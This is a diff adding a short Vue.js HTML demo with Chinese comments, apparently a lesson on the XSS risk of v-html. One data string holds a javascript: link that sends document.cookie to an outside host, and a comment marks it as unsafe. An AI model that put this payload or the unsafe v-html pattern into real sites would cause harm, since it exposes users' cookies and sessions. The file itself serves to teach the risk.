@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<div id="app">
+<!--  v-html 有严重的安全风险  -->
+<!--    在网站上动态渲染任何 html 都非常危险，容易导致 XXS 攻击-->
+<!--    一定要在可信的内容上使用 v-html ，永远不要用在用户提交的内容上-->
+    <div v-html="str2"></div>
+</div>
+<script src="js/vue.js"></script>
+<script>
+    new Vue({
+        el: '#app',
+        data: {
+            str: '点我点我',
+            // 点击跳转后附带当前页面的 cookie ，不安全
+            str2: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>点我点我</a>'
+        }
+    })
+</script>
+</body>
+</html>
